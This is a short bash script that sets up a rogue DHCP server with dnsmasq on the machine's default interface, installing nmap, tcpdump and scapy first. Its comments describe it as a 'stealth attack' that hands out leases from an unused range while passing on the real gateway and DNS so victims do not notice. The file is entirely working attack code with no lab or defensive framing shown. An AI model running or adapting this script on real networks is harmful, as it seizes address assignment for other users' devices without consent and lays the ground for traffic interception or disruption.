#!/bin/bash

set -e

INTERFACE=$(ip -o -4 route show to default | awk '{print $5; exit}')
LEASE_RANGE="10.10.20.210,10.10.20.220,12h" # lease range for rogue DHCP server can be adjusted as needed as unused ip range 
GATEWAY=$(ip route | awk '/default/ {print $3; exit}') # this is a stealth attack, so we will use the real gateway as the default gateway for the rogue DHCP server.
DNS=$(resolvectl dns "$INTERFACE" | awk '{print $4; exit}')

if [[ $EUID -ne 0 ]]; then
    echo "[ERROR] Please run as root."
    exit 1
fi

echo "[*] Checking required packages..."

PACKAGES=(
    dnsmasq
    isc-dhcp-client
    tcpdump
    nmap
    python3-scapy
)

for pkg in "${PACKAGES[@]}"; do
    if ! dpkg -s "$pkg" >/dev/null 2>&1; then
        echo "[*] Installing $pkg..."
        apt-get update
        apt-get install -y "$pkg"
    else
        echo "[+] $pkg already installed."
    fi
done

echo "[*] Stopping any existing dnsmasq..."
systemctl stop dnsmasq 2>/dev/null || true
pkill dnsmasq 2>/dev/null || true

echo "[*] Starting rogue DHCP server..."

dnsmasq \
    --no-daemon \
    --bind-interfaces \
    --interface="$INTERFACE" \
    --dhcp-authoritative \
    --dhcp-range="$LEASE_RANGE" \
    --dhcp-option=3,"$GATEWAY" \
    --dhcp-option=6,"$DNS"
